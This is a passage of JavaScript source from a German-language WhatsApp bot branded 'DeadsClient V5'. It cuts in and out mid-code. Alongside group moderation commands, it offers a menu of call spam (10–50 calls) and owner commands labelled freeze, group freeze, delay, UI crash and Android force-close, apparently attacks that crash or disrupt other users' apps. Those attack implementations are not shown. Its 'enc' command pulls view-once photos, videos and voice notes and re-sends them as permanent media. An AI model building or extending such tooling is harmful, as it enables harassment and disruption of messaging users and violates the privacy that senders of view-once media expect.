  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  try {
    const from = msg.key.remoteJid;

    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const day = now.getDate().toString().padStart(2, "0");
    const month = (now.getMonth() + 1).toString().padStart(2, "0");
    const year = now.getFullYear();

    const currentTime = `${hours}:${minutes}`;
    const currentDate = `${day}.${month}.${year}`;

    const caption = `╭━─━─⚕️𝐂𝐚𝐥𝐥𝐌𝐞𝐧𝐮⚕️─━─━╮
          🥷𝐶𝑎𝑙𝑙𝑠𝑝𝑎𝑚 𝟏𝟎-𝟓𝟎🥷
        ⭐️  ${currentDate}
        ⭐️  ${currentTime} Uhr🕰
     ©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸
╰━─━─⚕️𝐂𝐚𝐥𝐥𝐌𝐞𝐧𝐮⚕️─━─━╯`;
  
    const jpegThumbnail = fs.readFileSync('./dev/deadmenu.jpg');

    const statusQuoted = {
      key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        id: crypto.randomUUID()
      },
      message: {
        extendedTextMessage: {
          text: '✠︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭'
        }
      }
    };

    const messagePayload = {
      ephemeralMessage: {
        message: {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                messageSecret: crypto.randomBytes(32),
              },
              buttonsMessage: {
                contentText: caption,
                footerText: '© 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
                locationMessage: {
                  degreesLatitude: 25.2048,
                  degreesLongitude: 55.2708,
                  name: "DeadsClient HQ",
                  address: "Dubai",
                  jpegThumbnail 
                },
                buttons: [
                  {
                    buttonId: 'open_list_1',
                    buttonText: { displayText: '⭐️𝐂𝐚𝐥𝐥' },
                    type: 4,
                    nativeFlowInfo: {
                      name: 'single_select',
                      paramsJson: JSON.stringify({
                        title: "©𝐶𝑎𝑙𝑙𝑠𝑝𝑎𝑚",
                        sections: [
                          {
                            title: "©𝐂𝐚𝐥𝐥 𝐅𝐮𝐧𝐜𝐭𝐢𝐨𝐧𝐬",
                            rows: [
                              { title: '┏─══─━══─| 𝐂𝐚𝐥𝐥𝐌𝐞𝐧𝐮 |─══━─══─┓', description: '', id: '' },
                              { title: '', description: '©𝐂𝐚𝐥𝐥 𝟏𝟎', id: '.cal 10' },
                              { title: '', description: '©𝐂𝐚𝐥𝐥 𝟐𝟎', id: '.cal 20' },
                              { title: '', description: '©𝐂𝐚𝐥𝐥 𝟑𝟎', id: '.cal 30' },
                              { title: '', description: '©𝐂𝐚𝐥𝐥 𝟒𝟎', id: '.cal 40' },
                              { title: '', description: '©𝐂𝐚𝐥𝐥 𝟓𝟎', id: '.cal 50' },
                              { title: '┗─══─━══─| 𝐂𝐚𝐥𝐥𝐌𝐞𝐧𝐮 |─══━─══─┛', description: '', id: '' }
                            ]
                          }
                        ]
                      })
                    },
                    type: 'RESPONSE'
                  },
                  {
                    buttonId: 'open_list_2',
                    buttonText: { displayText: '𝐌𝐞𝐧𝐮⭐️' },
                    type: 4,
                    nativeFlowInfo: {
                      name: 'single_select',
                      paramsJson: JSON.stringify({
                        title: "Menu©",
                        sections: [
                          {
                            title: "©𝐁𝐨𝐭 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
                            rows: [
                              { title: '┏─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┓', description: '', id: '' },
                              { title: '', description: '©Freeze', id: '.freeze' },
                              { title: '', description: '©GroupFreeze', id: '.grpfreeze' },
                              { title: '', description: '©Delay', id: '.delay' },
                              { title: '', description: '©StatusMention Delay', id: '.blackdelay' },
                              { title: '', description: '©OrderUiCrash', id: '.orderui 3 5' },
                              { title: '', description: '©ForceClose Perma? (only andro)', id: '.forceclose' },
                                { title: '┗─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┛', description: '', id: '' }
                            ]
                          }
                        ]
                      })
                    },
                    type: 'RESPONSE'
                  }
                ],
                headerType: 6 
              }
            }
          }
        }
      }
    };
    await sock.sendjsonv3(from, messagePayload, { quoted: statusQuoted });

  } catch (err) {
    console.error('[❌ Fehler in Case bun]', err);
  }

  break;
}
//==========================Menus=======================//
//=============PING============================//          
      case 'ping': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
        const process = require('process');
        const start = Date.now();
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const currentTime = new Date().toLocaleString('de-DE');
        await new Promise((res) => setTimeout(res, 10));
        const latency = Date.now() - start;

        const dead = {
          key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "statusMessageId",
            participant: "0@s.whatsapp.net"
          },
          message: {
            extendedTextMessage: {
              text: "⭐️︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️"
            }
          }
        };

        const message = `╭───❍ *DeadsClient Ping* ❍───╮
│
│ 🏓 *Pong:* ${latency}ms
│ ⏱️ Sek.: *${(latency / 1000).toFixed(2)}s*
│ 🕒 *Zeit:* ${currentTime}
│ ⌛ *Uptime:* ${days} Tg ${hours} Std ${minutes} Min
│ ⭐️  🄿🅁🄰̈🄵🄸🅇--> (.)
│ 🏷Dead created the bot
╰────────────────────╯
©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸`;

        await sock.sendMessage(from, {
          text: message,
          contextInfo: {
            forwardingScore: 127,
            isForwarded: true,
            externalAdReply: {
              title: '🩸DeadsClient Ping-System🩸',
              body: '🌹 Made by: 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
              previewType: 'LINK',
              thumbnailUrl: 'https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg',
              mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
              mediaType: 2
            },
            quotedMessage: dead.message,
            quotedMessageId: dead.key.id
          }
        }, { quoted: dead });

        await sendReaction(from, msg, '✅');
        break;
      }
//=============PING============================//
//====================================🍷Funktion für alles im Newsletter🍷============================================//
      
async function sendStyledMessage(jid, text) {
  const dead = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "statusMessageId",
      participant: "0@s.whatsapp.net"
    },
    message: {
      extendedTextMessage: {
        text: "⭐️︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️"
      }
    }
  };

  await sock.sendMessage(jid, {
    text,
    contextInfo: {
      forwardingScore: 127,
      isForwarded: true,
      externalAdReply: {
        title: '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
        body: '🌹 t.me/deadsclient1',
        previewType: 'LINK',
        thumbnailUrl: 'https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2
      },
      quotedMessage: dead.message,
      quotedMessageId: dead.key.id
    }
  }, { quoted: dead });
}

//====================================🍷Funktion für alles im Newsletter🍷============================================//
      
//=============ADMIN PRÜFUNG============================//
async function isUserAdmin(jid, sender) {
  try {
    const groupMeta = await sock.groupMetadata(jid);
    const participant = groupMeta.participants.find(p => p.id === sender);
    return participant?.admin !== undefined;
  } catch (e) {
    console.error('Fehler bei Admin-Check:', e.message);
    return false;
  }
}
// ============= ADMIN PRÜFUNG IM CASE ================ //
//=============Gruppen Func============================//
case 'welcome': {
  const sender = msg.key.participant || msg.key.remoteJid;


  const groupStatus = welcomeGroups[from];
  const newStatus = !groupStatus;
  welcomeGroups[from] = newStatus;
  saveWelcomeData();

  const statusText = newStatus ? '✅ Willkommensnachricht **aktiviert**.' : '❌ Willkommensnachricht **deaktiviert**.';
  await sendStyledMessage(from, statusText);
}
break;
case 'tagall': {
  if (!isGroup) {
    await sock.sendMessage(from, { text: 'Dieser Befehl funktioniert nur in Gruppen.' });
    break;
  }

  const groupMetadata = await sock.groupMetadata(from);
  const participants = groupMetadata.participants;
  const mentions = participants.map((p) => p.id);
  
  const messageText = '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸\nTagged All\n\n\n' + 
    mentions.map((id) => `⭐️ • @${id.split('@')[0]}`).join('\n');
  
  await sock.sendMessage(from, {
    text: messageText,
    mentions: mentions,
  });
}
break;
case 'grpinfo': {
  try {
    const groupMetadata = await sock.groupMetadata(from);
    const groupImg = await sock.profilePictureUrl(from, 'image').catch(() => null);

    const subject = groupMetadata.subject || 'Unbekannt';
    const description = groupMetadata.desc || 'Keine Beschreibung';
    const owner = groupMetadata.owner || 'Unbekannt';
    const creation = groupMetadata.creation ? new Date(groupMetadata.creation * 1000).toLocaleString() : 'Unbekannt';
    const groupId = groupMetadata.id || 'Unbekannt';
    const inviteCode = groupMetadata.inviteCode || 'Kein Einladungslink verfügbar';
    const descOwner = groupMetadata.descOwner || 'Unbekannt';
    const descTime = groupMetadata.descTime ? new Date(groupMetadata.descTime * 1000).toLocaleString() : 'Unbekannt';

    const participants = groupMetadata.participants || [];
    const participantsCount = participants.length;
    const admins = participants.filter(p => p.admin === 'admin');
    const superadmins = participants.filter(p => p.admin === 'superadmin');
    const adminsCount = admins.length;
    const superadminsCount = superadmins.length;
    const allAdmins = [...admins, ...superadmins];
    const adminMentions = allAdmins.map(a => `@${a.id.split('@')[0]}`).join(', ');

    // Optional: Gruppen-Einstellungen, falls über API verfügbar
    const isAnnounce = groupMetadata.announce; // true = Nur Admins können schreiben
    const groupSettings = isAnnounce ? '🔒 Nur Admins dürfen schreiben' : '🔓 Alle dürfen schreiben';

    const infoMessage = 
      `📋 *Gruppeninfo:*\n` +
      `👥 *Name:* ${subject}\n` +
      `📝 *Beschreibung:* ${description}\n` +
      `💬 *Beschreibung geändert von:* @${descOwner.split('@')[0]} am ${descTime}\n` +
      `👑 *Eigentümer:* @${owner.split('@')[0]}\n` +
      `📆 *Erstellt am:* ${creation}\n` +
      `🆔 *Gruppen-ID:* ${groupId}\n` +
      `🔗 *Einladungslink:* https://chat.whatsapp.com/${inviteCode}\n` +
      `👤 *Teilnehmer:* ${participantsCount}\n` +
      `🛡️ *Admins:* ${adminsCount} | 👑 *Superadmins:* ${superadminsCount}\n` +
      `👮 *Adminliste:* ${adminMentions || 'Keine'}\n` +
      `⚙️ *Einstellungen:* ${groupSettings}`;

    await sock.sendMessage(from, {
      image: groupImg ? { url: groupImg } : undefined,
      caption: infoMessage,
      contextInfo: {
        mentionedJid: allAdmins.map(a => a.id),
        forwardingScore: 127,
        isForwarded: true,
        externalAdReply: {
          title: '⭐️©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5 𝐆𝐫𝐨𝐮𝐩𝐢𝐧𝐟𝐨⭐️',
          body: '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
          previewType: 'LINK',
          thumbnailUrl: 'https://i.postimg.cc/qMsJVGGQ/IMG-20250612-WA0067.jpg',
          mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
          mediaType: 2
        }
      }
    });

  } catch (e) {
    console.error('Fehler beim Abrufen der Gruppeninfo:', e.message);
    await sendStyledMessage(from, '❌ Gruppeninfo konnte nicht abgerufen werden.');
  }
}
break;
case 'farewell': {
  const sender = msg.key.participant || msg.key.remoteJid;

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können den Abschiedsmodus ändern.');
    return;
  }

  const groupStatus = farewellGroups[from];
  const newStatus = !groupStatus;
  farewellGroups[from] = newStatus;
  saveFarewellData();

  const statusText = newStatus ? '✅ Abschiebenachricht **aktiviert**.' : '❌ Abschiedsnachricht **deaktiviert**.';
  await sendStyledMessage(from, statusText);
}
break;
case 'kick': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können diesen Befehl benutzen.');
    return;
  }

  if (mentioned.length === 0) {
    await sendStyledMessage(from, '❌ Bitte markiere einen Nutzer, den du entfernen willst.');
    return;
  }

  try {
    await sock.groupParticipantsUpdate(from, mentioned, 'remove');
    await sendStyledMessage(from, '✅ Nutzer wurde aus der Gruppe entfernt.');
  } catch (e) {
    console.error('Fehler beim Kicken:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Entfernen des Nutzers.');
  }
}
break;
case 'add': {
  try {
    if (!(await isUserAdmin(from, sender))) {
      await sendStyledMessage(from, '❌ Nur Admins können Benutzer hinzufügen.');
      break;
    }

    const numberToAdd = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (!numberToAdd) {
      await sendStyledMessage(from, 'Bitte gib eine gültige Nummer an, z.B. !add 491234567890');
      break;
    }

    await sock.groupParticipantsUpdate(from, [numberToAdd], 'add');
    await sendStyledMessage(from, `✅ Benutzer mit der Nummer +${numberToAdd.split('@')[0]} wurde hinzugefügt.`);

  } catch (error) {
    console.error('Fehler beim Hinzufügen:', error);
    await sendStyledMessage(from, '❌ Fehler beim Hinzufügen des Benutzers.');
  }
  break;
}
case 'unmute': {
  const sender = msg.key.participant || msg.key.remoteJid;

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können diesen Befehl benutzen.');
    return;
  }

  try {
    await sock.groupSettingUpdate(from, 'not_announcement'); 
    await sendStyledMessage(from, '🔊 Gruppe wurde wieder freigegeben (alle dürfen schreiben).');
  } catch (e) {
    console.error('Fehler beim Freigeben:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Freigeben der Gruppe.');
  }
}
break;
case 'mute': {
  const sender = msg.key.participant || msg.key.remoteJid;

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können diesen Befehl benutzen.');
    return;
  }

  try {
    await sock.groupSettingUpdate(from, 'announcement'); // 
    await sendStyledMessage(from, '🔇 Gruppe wurde stumm geschaltet (nur Admins dürfen schreiben).');
  } catch (e) {
    console.error('Fehler beim Stummschalten:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Stummschalten der Gruppe.');
  }
}
break;
case 'setname': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const text = args.join(' ');

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können den Namen ändern.');
    return;
  }

  if (!text) {
    await sendStyledMessage(from, '❌ Bitte gib einen neuen Gruppennamen ein.');
    return;
  }

  try {
    await sock.groupUpdateSubject(from, text);
    await sendStyledMessage(from, '✅ Gruppenname wurde aktualisiert.');
  } catch (e) {
    console.error('Fehler beim Setzen des Namens:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Aktualisieren des Gruppennamens.');
  }
}
break;
case 'setdesc': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const text = args.join(' ');

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können die Beschreibung ändern.');
    return;
  }

  if (!text) {
    await sendStyledMessage(from, '❌ Bitte gib eine neue Beschreibung ein.');
    return;
  }

  try {
    await sock.groupUpdateDescription(from, text);
    await sendStyledMessage(from, '✅ Gruppenbeschreibung wurde aktualisiert.');
  } catch (e) {
    console.error('Fehler beim Setzen der Beschreibung:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Aktualisieren der Gruppenbeschreibung.');
  }
}
break;
case 'grouplink': {
  try {
    const code = await sock.groupInviteCode(from);

    await sock.sendMessage(from, {
      text: `🔗 Gruppenlink:\nhttps://chat.whatsapp.com/${code}`,
      contextInfo: {
        forwardingScore: 127,
        isForwarded: true,
        externalAdReply: {
          title: 'DeadsClient GroupLink',
          body: '🌹 Made by: ⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
          previewType: 'LINK',
          thumbnailUrl: 'https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg',
          mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
          mediaType: 2
        }
      }
    });

  } catch (e) {
    console.error('Fehler beim Abrufen des Links:', e.message);
    await sendStyledMessage(from, '❌ Gruppenlink konnte nicht abgerufen werden.');
  }
}
break;
case 'revoke': {
  const sender = msg.key.participant || msg.key.remoteJid;

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Admins können den Gruppenlink zurücksetzen.');
    return;
  }

  try {
    await sock.groupRevokeInvite(from);
    await sendStyledMessage(from, '✅ Neuer Gruppenlink wurde erstellt.');
  } catch (e) {
    console.error('Fehler beim Zurücksetzen des Links:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Zurücksetzen des Links.');
  }
}
break;

case 'del': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const isGroup = from.endsWith('@g.us');

  if (isGroup && !(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Admins dürfen Nachrichten in Gruppen löschen.');
    return;
  }

  const quotedId = msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
  const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;

  if (!quotedId) {
    await sendStyledMessage(from, '❌ Bitte antworte auf eine Nachricht zum Löschen.');
    return;
  }

  try {
    
    await sock.sendMessage(from, {
      delete: {
        remoteJid: from,
        fromMe: false,
        id: quotedId,
        participant: quotedParticipant || sender
      }
    });

    
    await sock.sendMessage(from, {
      delete: {
        remoteJid: from,
        fromMe: msg.key.fromMe,
        id: msg.key.id,
        participant: sender
      }
    });

   
    console.log('✅ Nachricht und Zitat gelöscht.');

  } catch (e) {
    console.error('❌ Fehler beim Löschen:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Löschen.');
  }
  break;
}
case 'hidetagall': {
  if (!isGroup) {
    await sock.sendMessage(from, { text: 'Dieser Befehl funktioniert nur in Gruppen.' });
    break;
  }

  const groupMetadata = await sock.groupMetadata(from);
  const participants = groupMetadata.participants;
  const mentions = participants.map((p) => p.id);

  const messageText = '        ';

  await sock.sendMessage(from, {
    text: messageText,
    mentions: mentions,
  });
}
break;

case 'antilink': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Dieser Befehl funktioniert nur in Gruppen.');
  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Admins dürfen Anti-Link ein- oder ausschalten.');
    return;
  }

  if (antiLinkGroups[from]) {
    delete antiLinkGroups[from];
    saveAntiLink(); // Diese Funktion musst du natürlich definieren
    await sendStyledMessage(from, '🔕 Anti-Link wurde **deaktiviert**.');
  } else {
    antiLinkGroups[from] = true;
    saveAntiLink();
    await sendStyledMessage(from, '🔒 Anti-Link ist jetzt **aktiv**.');
  }
  break;
}

case 'linkbypass': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Nur in Gruppen.');
  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Admins dürfen das.');
    return;
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!mentioned) return sendStyledMessage(from, '👤 Bitte markiere den Nutzer, den du freischalten willst.');

  const userId = mentioned.split('@')[0];

  if (!linkBypassUsers[from]) linkBypassUsers[from] = [];
  if (!linkBypassUsers[from].includes(userId)) {
    linkBypassUsers[from].push(userId);
    saveLinkBypass();
    await sendStyledMessage(from, `✅ @${userId} darf jetzt **Links senden**.`, { mentions: [mentioned] });
  } else {
    await sendStyledMessage(from, `ℹ️ @${userId} ist **bereits freigeschaltet**.`, { mentions: [mentioned] });
  }

  break;
}

case 'unlinkbypass': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Nur in Gruppen.');
  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Admins dürfen das.');
    return;
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!mentioned) return sendStyledMessage(from, '👤 Bitte markiere den Nutzer.');

  const userId = mentioned.split('@')[0];

  if (linkBypassUsers[from]?.includes(userId)) {
    linkBypassUsers[from] = linkBypassUsers[from].filter(uid => uid !== userId);
    saveLinkBypass();
    await sendStyledMessage(from, `🛑 @${userId} darf jetzt **keine Links** mehr senden.`, { mentions: [mentioned] });
  } else {
    await sendStyledMessage(from, `ℹ️ @${userId} war **nicht freigeschaltet**.`, { mentions: [mentioned] });
  }

  break;
}

case 'promote': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können diesen Befehl benutzen.');
    return;
  }

  if (!mentionedJid) {
    await sendStyledMessage(from, '❌ Bitte erwähne den Benutzer, den du zum Admin machen willst.');
    return;
  }

  try {
    await sock.groupParticipantsUpdate(from, [mentionedJid], 'promote');
    await sendStyledMessage(from, `✅ @${mentionedJid.split('@')[0]} wurde zum Admin befördert.`, { mentions: [mentionedJid] });
  } catch (e) {
    console.error('Fehler bei der Beförderung:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Befördern des Teilnehmers.');
  }
}
break;

case 'demote': {
  const sender = msg.key.participant || msg.key.remoteJid;
  const mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können diesen Befehl benutzen.');
    return;
  }

  if (!mentionedJid) {
    await sendStyledMessage(from, '❌ Bitte erwähne den Benutzer, den du degradieren willst.');
    return;
  }

  try {
    await sock.groupParticipantsUpdate(from, [mentionedJid], 'demote');
    await sendStyledMessage(from, `✅ @${mentionedJid.split('@')[0]} wurde als Admin entfernt.`, { mentions: [mentionedJid] });
  } catch (e) {
    console.error('Fehler bei der Degradierung:', e.message);
    await sendStyledMessage(from, '❌ Fehler beim Entfernen des Admin-Status.');
  }
}
break;
//=============Gruppen Func============================//


//=============Extract viewOnceMessage============================//          
case 'enc': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  try {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    if (!quoted) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Bitte antworte auf ein Medien-Element (Bild, Video oder Sprachnachricht)!"
      }, { quoted: msg });
      break;
    }

    const isViewOnce = quoted?.viewOnceMessage?.message;
    const actualMessage = isViewOnce ? quoted.viewOnceMessage.message : quoted;

    const image = actualMessage?.imageMessage;
    const video = actualMessage?.videoMessage;
    const audio = actualMessage?.audioMessage;

    if (!image && !video && !audio) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Nur ViewOnce-Bild, ViewOnce-Video oder Sprachnachricht wird unterstützt!"
      }, { quoted: msg });
      break;
    }

    let mediaType = image ? 'image' : video ? 'video' : 'audio';
    const mediaMessage = image ? actualMessage.imageMessage : video ? actualMessage.videoMessage : actualMessage.audioMessage;

    const stream = await downloadContentFromMessage(mediaMessage, mediaType);
    const bufferChunks = [];
    for await (const chunk of stream) {
      bufferChunks.push(chunk);
    }
    const buffer = Buffer.concat(bufferChunks);

    if (image) {
      await sock.sendMessage(msg.key.remoteJid, {
        image: buffer,
        caption: "┏─══─|𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐛𝐲 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭|─══─┓\n📷 Hier ist das ViewOnce-Bild!\n┗─══─|𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐛𝐲 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭|─══─┛"
      }, { quoted: msg });
    } else if (video) {
      await sock.sendMessage(msg.key.remoteJid, {
        video: buffer,
        caption: "┏─══─|𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐛𝐲 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭|─══─┓\n🎬 Hier ist das ViewOnce-Video!\n┗─══─|𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐛𝐲 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭|─══─┛"
      }, { quoted: msg });
    } else if (audio) {
      await sock.sendMessage(msg.key.remoteJid, {
        audio: buffer,
        mimetype: 'audio/ogg; codecs=opus',
        ptt: true, // oder false, je nachdem ob es eine Sprachnachricht oder Audio sein soll
      }, { quoted: msg });
    }

  } catch (err) {
    console.error("❌ Fehler beim encrypten der viewonceMsg:", err);
    await sock.sendMessage(msg.key.remoteJid, {
      text: "⚠️ Fehler beim Verarbeiten des Mediums."
    }, { quoted: msg });
  }
  break;
}
//=============Extract viewOnceMessage============================//    
//=============PTV============================//
case 'ptv': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  try {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const isViewOnce = quoted?.viewOnceMessage?.message;
    const actualMessage = isViewOnce ? quoted.viewOnceMessage.message : quoted;
    const sticker = actualMessage?.stickerMessage;
    const gif = actualMessage?.videoMessage?.gifPlayback;
    const video = actualMessage?.videoMessage && !gif;
    const image = actualMessage?.imageMessage;
    if (!sticker && !gif && !video && !image) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Bitte antworte auf einen animierten Sticker, GIF, Bild, ViewOnce oder kurzes Video!"
      }, { quoted: msg });
      break;
    }
    if (video) {
      const duration = actualMessage.videoMessage.seconds || 0;
      if (duration > 50) {
        await sock.sendMessage(msg.key.remoteJid, {
          text: "❌ Bitte ein Video mit maximal 5 Sekunden Länge schicken!"
        }, { quoted: msg });
        break;
      }
    }
    let mediaType;
    if (sticker) mediaType = 'sticker';
    else if (gif || video) mediaType = 'video';
    else if (image) mediaType = 'image';
    const mediaMessage =
      sticker ? actualMessage.stickerMessage :
      gif || video ? actualMessage.videoMessage :
      image ? actualMessage.imageMessage :
      null;
    const stream = await downloadContentFromMessage(mediaMessage, mediaType);
    const bufferChunks = [];
    for await (const chunk of stream) {
      bufferChunks.push(chunk);
    }
    const buffer = Buffer.concat(bufferChunks);
    await sock.sendMessage(msg.key.remoteJid, {
      video: buffer,
      mimetype: 'video/webp',
      caption: "🎥 Hier ist dein PTV!",
      ptv: true
    }, { quoted: msg });

  } catch (err) {
    console.error("❌ Fehler bei getptv:", err);
    await sock.sendMessage(msg.key.remoteJid, {
      text: "⚠️ Fehler beim Senden des PTV."
    }, { quoted: msg });
  }
  break;
}  

 
case 'ptv3': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  try {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const sticker = quoted?.stickerMessage;
    if (!sticker) {
      await sock.sendMessage(from, { text: "> ⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸\n❌ Bitte antworte auf einen *animierten Sticker*!" }, { quoted: msg });
      break;
    }
    const stream = await downloadContentFromMessage(sticker, 'sticker');
    const buffer = Buffer.concat(await streamToBuffer(stream));
